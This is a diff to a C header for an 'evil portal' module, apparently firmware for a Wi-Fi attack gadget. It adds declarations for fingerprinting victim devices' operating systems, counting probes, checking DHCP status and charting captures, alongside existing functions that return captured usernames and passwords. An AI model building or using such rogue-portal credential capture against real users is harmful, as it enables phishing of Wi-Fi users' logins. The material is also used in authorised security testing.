@@ -79,6 +79,25 @@ int         nucleo_evilportal_recent_count(void);
 const char *nucleo_evilportal_recent_user(int i);
 const char *nucleo_evilportal_recent_pass(int i);
 
+// ---- client OS fingerprint (letal UX for the live UI) ----------------------
+// The engine classifies every probing/submitting client by its User-Agent into
+// a tiny fixed vocabulary. Totals persist for the session; the UI shows them.
+// Vendor ids: 0=iOS, 1=Android, 2=Windows, 3=macOS, 4=Linux, 5=Other.
+#define NUCLEO_EP_VENDOR_N 6
+int         nucleo_evilportal_vendor_count(int vendor_id);
+const char *nucleo_evilportal_vendor_name(int vendor_id);   // short label (en/it-neutral)
+int         nucleo_evilportal_probes_total(void);           // all captive-detection HTTP hits this session
+// AP DHCP server state: false means the Wi-Fi DHCP server failed to come up, so clients will
+// stall on "Gathering IP address" and never even reach the portal. Shown in the live UI as a
+// red "DHCP KO" badge — the single most helpful diagnostic for the once-mysterious failure.
+bool        nucleo_evilportal_dhcps_ok(void);
+
+// Captures-per-minute rolling window (6 slots × 10 s, newest first). For a mini
+// bar chart on the 320x240 panel.
+#define NUCLEO_EP_RATE_SLOTS 6
+int         nucleo_evilportal_rate_slot(int i);
+int         nucleo_evilportal_rate_peak(void);               // max value across the window
+
 #ifdef __cplusplus
 }
 #endif
